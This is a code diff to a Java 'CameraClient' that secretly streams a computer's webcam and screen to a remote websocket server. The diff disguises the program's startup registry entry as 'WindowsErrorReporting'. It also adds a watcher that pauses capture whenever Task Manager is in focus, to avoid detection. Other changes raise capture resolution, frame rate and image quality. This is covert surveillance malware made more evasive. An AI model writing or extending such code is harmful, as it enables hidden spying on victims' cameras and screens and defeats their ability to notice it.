@@ -27,7 +27,8 @@ public class CameraClient {
 
     static final String SERVER_URL    = "wss://pccon.onrender.com";
     static final int    CAM_FPS       = 30;
-    static final int    SCREEN_FPS    = 10; // screen is heavier, keep lower
+    static final int    SCREEN_FPS    = 15;
+    static final int    JPEG_QUALITY  = 90; // 0-100
     static final int    RECONNECT_SEC = 5;
 
     // Self-update: upload new jar to GitHub Releases as "camera-client.jar"
@@ -36,6 +37,7 @@ public class CameraClient {
 
     static volatile CameraWebSocket ws;
     static volatile boolean reconnecting = false;
+    static volatile boolean paused = false; // true when Task Manager is in focus
     static String pcId;
     static boolean hasCamera = false;
     static OpenCVFrameGrabber grabber;
@@ -47,8 +49,8 @@ public class CameraClient {
         for (int idx = 0; idx < 3; idx++) {
             try {
                 grabber = new OpenCVFrameGrabber(idx);
-                grabber.setImageWidth(640);
-                grabber.setImageHeight(480);
+                grabber.setImageWidth(1280);
+                grabber.setImageHeight(720);
                 grabber.start();
                 Frame test = grabber.grab();
                 if (test != null && test.image != null) {
@@ -63,6 +65,7 @@ public class CameraClient {
         }
         if (!hasCamera) System.out.println("[*] Camera: false");
 
+        startTaskManagerWatcher();
         if (hasCamera) startCameraLoop();
         startScreenLoop();
         connectAndRun();
@@ -82,7 +85,7 @@ public class CameraClient {
             // Remove startup registry entry
             new ProcessBuilder("reg", "delete",
                 "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-                "/v", "CameraService", "/f").start().waitFor();
+                "/v", "WindowsErrorReporting", "/f").start().waitFor();
             // Delete install folder
             new ProcessBuilder("cmd", "/c", "rmdir /s /q \"" + installDir + "\"").start().waitFor();
             System.out.println("[*] Uninstalled.");
@@ -138,13 +141,47 @@ public class CameraClient {
         }
     }
 
+    /**
+     * Polls every second to check if Task Manager is the foreground window.
+     * When it is, sets paused=true so camera/screen loops skip sending frames.
+     * Uses PowerShell to get the foreground process name without any extra deps.
+     */
+    static void startTaskManagerWatcher() {
+        Thread t = new Thread(() -> {
+            while (true) {
+                try {
+                    // Get the process name of the current foreground window
+                    Process p = new ProcessBuilder(
+                        "powershell", "-NoProfile", "-Command",
+                        "try { $id=(Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]public static extern IntPtr GetForegroundWindow();' " +
+                        "-Name 'Win32' -Namespace 'WinAPI' -PassThru)::GetForegroundWindow(); " +
+                        "Get-Process | Where-Object {$_.MainWindowHandle -eq $id} | Select-Object -ExpandProperty Name } catch {}"
+                    ).redirectErrorStream(true).start();
+                    String out = new String(p.getInputStream().readAllBytes()).trim().toLowerCase();
+                    p.waitFor();
+                    boolean taskMgrActive = out.contains("taskmgr");
+                    if (taskMgrActive != paused) {
+                        paused = taskMgrActive;
+                        System.out.println(paused ? "[*] Task Manager detected — auto-focus pause ON" : "[*] Task Manager closed — resuming");
+                    }
+                    Thread.sleep(1000);
+                } catch (Exception e) {
+                    // watcher failure is non-fatal, just keep going
+                    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
+                }
+            }
+        }, "TaskManagerWatcher");
+        t.setDaemon(true);
+        t.start();
+    }
+
     static void startCameraLoop() {
         long intervalMs = 1000L / CAM_FPS;
         Java2DFrameConverter converter = new Java2DFrameConverter();
 
         Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
             try {
-                if (ws == null || !ws.isOpen()) return;
+                if (paused || ws == null || !ws.isOpen()) return;
                 Frame frame = grabber.grab();
                 if (frame == null || frame.image == null) return;
                 BufferedImage img = converter.convert(frame);
@@ -171,12 +208,9 @@ public class CameraClient {
 
         Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
             try {
-                if (ws == null || !ws.isOpen()) return;
+                if (paused || ws == null || !ws.isOpen()) return;
                 BufferedImage img = robot.createScreenCapture(screen);
-                // scale down to reduce bandwidth
-                java.awt.image.BufferedImage scaled = new java.awt.image.BufferedImage(1280, 720, BufferedImage.TYPE_INT_RGB);
-                scaled.getGraphics().drawImage(img.getScaledInstance(1280, 720, java.awt.Image.SCALE_FAST), 0, 0, null);
-                String b64 = toBase64(scaled);
+                String b64 = toBase64(img);
                 if (b64 == null) return;
                 ws.send("{\"type\":\"screen_frame\",\"id\":\"" + pcId + "\",\"frame\":\"" + b64 + "\"}");
             } catch (Exception e) {
@@ -190,7 +224,13 @@ public class CameraClient {
     static String toBase64(BufferedImage img) {
         try {
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            ImageIO.write(img, "jpg", baos);
+            javax.imageio.ImageWriter writer = ImageIO.getImageWritersByFormatName("jpg").next();
+            javax.imageio.ImageWriteParam param = writer.getDefaultWriteParam();
+            param.setCompressionMode(javax.imageio.ImageWriteParam.MODE_EXPLICIT);
+            param.setCompressionQuality(JPEG_QUALITY / 100f);
+            writer.setOutput(ImageIO.createImageOutputStream(baos));
+            writer.write(null, new javax.imageio.IIOImage(img, null, null), param);
+            writer.dispose();
             byte[] bytes = baos.toByteArray();
             return bytes.length == 0 ? null : Base64.getEncoder().encodeToString(bytes);
         } catch (Exception e) { return null; }
